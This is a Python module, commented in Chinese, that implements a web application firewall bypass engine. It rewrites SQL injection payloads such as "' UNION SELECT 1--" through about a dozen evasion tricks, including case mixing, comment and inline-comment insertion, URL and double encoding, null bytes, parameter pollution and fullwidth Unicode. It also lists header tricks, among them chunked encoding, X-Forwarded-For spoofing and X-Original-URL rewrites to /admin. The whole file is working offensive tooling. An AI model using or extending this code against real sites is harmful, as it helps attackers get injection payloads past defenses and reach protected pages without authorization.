"""
WAF 绕过引擎.

对被 WAF 拦截的 payload 做变形, 绕过规则匹配.
支持 13+ 种绕过技术, 自动选择最有效的组合.

绕过策略:
    1. 大小写混淆:  UNION → UnIoN
    2. 注释插入:    UNION → UN/**/ION
    3. 编码绕过:    URL/Unicode/Hex/Base64
    4. 关键字替换:  UNION → UNION%0a (换行)
    5. 空格替代:    空格 → /**/ / %09 / %0a / ()
    6. 内联注释:    /*!UNION*/
    7. 双重编码:    %2555nion
    8. HPP:         HTTP 参数污染
    9. Chunked:     Transfer-Encoding: chunked
    10. Content-Type 变换
"""

import re
import random
import urllib.parse
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass, field


@dataclass
class BypassResult:
    """单个绕过尝试的结果"""
    strategy: str          # 用的绕过策略
    payload: str           # 变形后的 payload
    success: bool = False  # 是否绕过成功 (没被 403)
    status: int = 0
    length: int = 0
    reflects: bool = False # payload 是否在响应中 (真正注入成功)


class WAFBypass:
    """
    WAF 绕过引擎.

    用法:
        bypass = WAFBypass()
        # 生成一个 payload 的所有绕过变体
        variants = bypass.generate_variants("' UNION SELECT 1--")
        # 变体列表: 大小写/注释/编码/HPP 等

        # 自动尝试绕过 (需要 HTTP 客户端)
        result = await bypass.try_bypass(burp, url, "' UNION SELECT 1--")
    """

    # 绕过策略 (按有效性排序)
    STRATEGIES = [
        "case_mix",
        "comment_insert",
        "inline_comment",
        "space_replace",
        "url_encode",
        "double_encode",
        "newline_bypass",
        "tab_bypass",
        "paren_bypass",
        "concat_bypass",
        "hpp",
        "chunked_hint",
        "unicode_normalize",
    ]

    def generate_variants(self, payload: str) -> List[Tuple[str, str]]:
        """
        生成所有绕过变体.

        Returns:
            [(strategy_name, modified_payload), ...]
        """
        variants = []
        for strategy in self.STRATEGIES:
            method = getattr(self, f"_bypass_{strategy}", None)
            if method:
                try:
                    result = method(payload)
                    if result and result != payload:
                        variants.append((strategy, result))
                except Exception:
                    pass
        return variants

    # ============================================================
    # 绕过策略实现
    # ============================================================

    @staticmethod
    def _bypass_case_mix(payload: str) -> str:
        """大小写混淆: UNION → UnIoN"""
        result = []
        for i, ch in enumerate(payload):
            if ch.isalpha() and random.random() > 0.5:
                result.append(ch.swapcase())
            else:
                result.append(ch)
        return "".join(result)

    @staticmethod
    def _bypass_comment_insert(payload: str) -> str:
        """注释插入: UNION → UN/**/ION"""
        # 在关键字中间插入注释
        keywords = ["UNION", "SELECT", "INSERT", "UPDATE", "DELETE",
                    "DROP", "AND", "OR", "FROM", "WHERE"]
        result = payload
        for kw in keywords:
            # 在关键字中间分割插入注释
            mid = len(kw) // 2
            pattern = re.compile(kw, re.I)
            result = pattern.sub(
                lambda m: m.group()[:mid] + "/**/" + m.group()[mid:],
                result
            )
        return result

    @staticmethod
    def _bypass_inline_comment(payload: str) -> str:
        """内联注释: UNION → /*!50000UNION*/"""
        keywords = ["UNION", "SELECT", "INSERT", "UPDATE", "DELETE"]
        result = payload
        for kw in keywords:
            result = re.sub(kw, f"/*!50000{kw}*/", result, flags=re.I)
        return result

    @staticmethod
    def _bypass_space_replace(payload: str) -> str:
        """空格替代: ' ' → '/**/' """
        return payload.replace(" ", "/**/")

    @staticmethod
    def _bypass_url_encode(payload: str) -> str:
        """URL 编码关键字符"""
        # 只编码特殊字符, 不全编码
        special = {"'": "%27", '"': "%22", " ": "%20", "<": "%3C",
                   ">": "%3E", "=": "%3D", "(": "%28", ")": "%29"}
        result = payload
        for char, enc in special.items():
            result = result.replace(char, enc)
        return result

    @staticmethod
    def _bypass_double_encode(payload: str) -> str:
        """双重编码: %27 → %2527"""
        single = WAFBypass._bypass_url_encode(payload)
        return urllib.parse.quote(single, safe="")

    @staticmethod
    def _bypass_newline_bypass(payload: str) -> str:
        """换行绕过: UNION → UN%0aION"""
        keywords = ["UNION", "SELECT", "FROM", "WHERE"]
        result = payload
        for kw in keywords:
            mid = len(kw) // 2
            result = re.sub(kw, f"{kw[:mid]}%0a{kw[mid:]}", result, flags=re.I)
        return result

    @staticmethod
    def _bypass_tab_bypass(payload: str) -> str:
        """Tab 绕过: 空格 → %09"""
        return payload.replace(" ", "%09")

    @staticmethod
    def _bypass_paren_bypass(payload: str) -> str:
        """括号绕过: 空格 → () (MySQL)"""
        return payload.replace(" ", "()")

    @staticmethod
    def _bypass_concat_bypass(payload: str) -> str:
        """拼接绕过: UNION → CONC%00AT(UN, ION) (简化版)"""
        # 在 payload 前加 NULL 字节 (某些 WAF 截断)
        return "%00" + payload

    @staticmethod
    def _bypass_hpp(payload: str) -> str:
        """HPP (HTTP 参数污染): 在 payload 末尾加分隔"""
        return payload + "&id=1"  # WAF 可能只检查第一个参数

    @staticmethod
    def _bypass_chunked_hint(payload: str) -> str:
        """Chunked 提示 (实际绕过在 header 层)"""
        # 标记需要用 Transfer-Encoding: chunked
        return payload  # payload 不变, header 加 Transfer-Encoding

    @staticmethod
    def _bypass_unicode_normalize(payload: str) -> str:
        """Unicode 标准化绕过"""
        # 用 Unicode 全角字符替代部分 ASCII
        replacements = {"'": "\uff07", '"': "\uff02", ";": "\uff1b"}
        result = payload
        for char, uni in replacements.items():
            result = result.replace(char, uni)
        return result

    # ============================================================
    # 请求头绕过
    # ============================================================

    @staticmethod
    def get_header_bypasses() -> List[Dict[str, str]]:
        """返回 header 层的绕过策略"""
        return [
            # Transfer-Encoding chunked
            {"Transfer-Encoding": "chunked"},
            # Content-Type 变换
            {"Content-Type": "application/x-www-form-urlencoded; charset=ibm037"},
            # X-Forwarded-For 伪造
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Original-URL": "/admin", "X-Rewrite-URL": "/admin"},
            # 大小写 header
            {"content-type": "application/x-www-form-urlencoded"},
        ]
